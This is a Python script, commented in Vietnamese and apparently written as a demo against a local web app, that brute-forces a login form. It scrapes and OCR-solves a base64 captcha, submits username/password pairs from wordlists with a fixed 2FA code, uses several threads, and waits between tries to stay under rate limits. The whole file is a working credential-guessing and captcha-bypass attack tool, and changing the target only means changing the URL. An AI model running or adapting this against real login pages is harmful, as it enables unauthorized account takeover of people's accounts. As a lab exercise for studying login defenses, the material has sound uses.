import requests
import time
from concurrent.futures import ThreadPoolExecutor
import json
from PIL import Image
import io
import base64
import pytesseract  # Để OCR captcha
import argparse

class BruteForceAttack:
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.successful_attempts = []
        self.failed_attempts = 0
        self.start_time = None

    def solve_captcha(self, captcha_base64):
        """Thử giải mã captcha bằng OCR"""
        try:
            # Chuyển base64 thành image
            image_data = base64.b64decode(captcha_base64)
            image = Image.open(io.BytesIO(image_data))
            # Sử dụng pytesseract để OCR
            captcha_text = pytesseract.image_to_string(image).strip()
            return captcha_text
        except Exception as e:
            print(f"Error solving captcha: {e}")
            return None

    def try_login(self, username, password):
        """Thử đăng nhập với một username và password"""
        try:
            # Lấy trang login để get captcha
            response = self.session.get(f"{self.target_url}/login")
            if response.status_code != 200:
                print(f"Failed to get login page: {response.status_code}")
                return False

            # Tìm captcha image trong HTML
            import re
            captcha_match = re.search(r'data:image/png;base64,([^"]+)', response.text)
            if not captcha_match:
                print("Captcha not found in response")
                return False

            captcha_base64 = captcha_match.group(1)
            captcha_text = self.solve_captcha(captcha_base64)

            if not captcha_text:
                print("Failed to solve captcha")
                return False

            # Thử đăng nhập
            login_data = {
                'username': username,
                'password': password,
                'captcha': captcha_text,
                'totp_code': '123456'  # Giả lập mã 2FA
            }

            response = self.session.post(
                f"{self.target_url}/login",
                data=login_data,
                allow_redirects=False
            )

            if response.status_code == 302:  # Successful login typically redirects
                self.successful_attempts.append({
                    'username': username,
                    'password': password,
                    'time': time.time() - self.start_time
                })
                print(f"\n[SUCCESS] Found valid credentials - {username}:{password}")
                return True
            else:
                self.failed_attempts += 1
                print(f"\r[FAILED] Attempts: {self.failed_attempts}", end='')
                return False

        except Exception as e:
            print(f"\n[ERROR] {str(e)}")
            return False

    def run_attack(self, usernames, passwords, max_threads=5):
        """Chạy tấn công brute force"""
        print("\n[*] Starting Brute Force Attack...")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Usernames to try: {len(usernames)}")
        print(f"[*] Passwords to try: {len(passwords)}")
        
        self.start_time = time.time()
        combinations = [(u, p) for u in usernames for p in passwords]

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            for username, password in combinations:
                if len(self.successful_attempts) > 0:
                    break
                executor.submit(self.try_login, username, password)
                # Delay để tránh rate limit
                time.sleep(1)

        self.print_results()

    def print_results(self):
        """In kết quả tấn công"""
        total_time = time.time() - self.start_time
        print("\n\n=== Attack Results ===")
        print(f"Total attempts: {self.failed_attempts + len(self.successful_attempts)}")
        print(f"Failed attempts: {self.failed_attempts}")
        print(f"Successful attempts: {len(self.successful_attempts)}")
        print(f"Total time: {total_time:.2f} seconds")
        
        if self.successful_attempts:
            print("\nSuccessful Credentials:")
            for attempt in self.successful_attempts:
                print(f"Username: {attempt['username']}")
                print(f"Password: {attempt['password']}")
                print(f"Found in: {attempt['time']:.2f} seconds")

def load_wordlist(file_path):
    """Load danh sách từ file"""
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error loading wordlist: {e}")
        return []

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute Force Attack Demo')
    parser.add_argument('--url', default='http://localhost:5000', help='Target URL')
    parser.add_argument('--userlist', default='usernames.txt', help='Username wordlist file')
    parser.add_argument('--passlist', default='passwords.txt', help='Password wordlist file')
    parser.add_argument('--threads', type=int, default=3, help='Number of threads')
    
    args = parser.parse_args()

    usernames = load_wordlist(args.userlist)
    passwords = load_wordlist(args.passlist)

    if not usernames or not passwords:
        print("Error: Wordlists are empty or couldn't be loaded")
        exit(1)

    attacker = BruteForceAttack(args.url)
    attacker.run_attack(usernames, passwords, args.threads)